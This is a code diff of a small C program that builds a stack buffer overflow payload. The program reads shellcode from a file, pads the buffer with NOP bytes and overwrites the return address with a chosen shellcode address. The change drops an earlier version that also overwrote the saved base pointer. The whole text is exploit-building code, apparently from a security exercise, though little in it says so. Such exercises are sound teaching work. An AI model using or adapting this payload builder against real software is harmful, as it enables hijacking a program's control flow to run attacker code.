@@ -5,19 +5,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+void usage(char *name) {
+    fprintf(stderr, "usage: %s sc_file ret_off sc_addr\n", name);
+    exit(EXIT_FAILURE);
+}
+
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        fprintf(stderr, "usage: %s sc_file bp_off bp_value sc_addr\n",
-                argv[0]);
-        exit(EXIT_FAILURE);
-    }
+    char *this = argv[0];
+    if (argc != 4) usage(this);
     char *sc_file = argv[1]; 
+    int ret_off = strtol(argv[2], NULL, 10);
+    unsigned int sc_addr = strtoll(argv[3], NULL, 16);
 
-    int bp_off = strtol(argv[2], NULL, 10);
-    unsigned int bp_value = strtoll(argv[3], NULL, 16);
-    unsigned int sc_addr = strtoll(argv[4], NULL, 16);
-
-    int blen = (bp_off + 2) * 4;
+    int blen = (ret_off + 1) * 4;
     unsigned char *buf = malloc(sizeof(unsigned char) * blen);
     if (buf == NULL) {
         perror("malloc");
@@ -35,9 +35,8 @@ int main(int argc, char *argv[]) {
     for (int i = k - 1; i < blen; i++)
         buf[i] = 0x90;
 
-    unsigned int *bp = (unsigned int *)buf + bp_off;
-    bp[0] = bp_value;
-    bp[1] = sc_addr;
+    unsigned int *bp = (unsigned int *)buf + ret_off;
+    *bp = sc_addr;
     
     for (int i = 0; i < blen; i++)
         putchar(buf[i]);
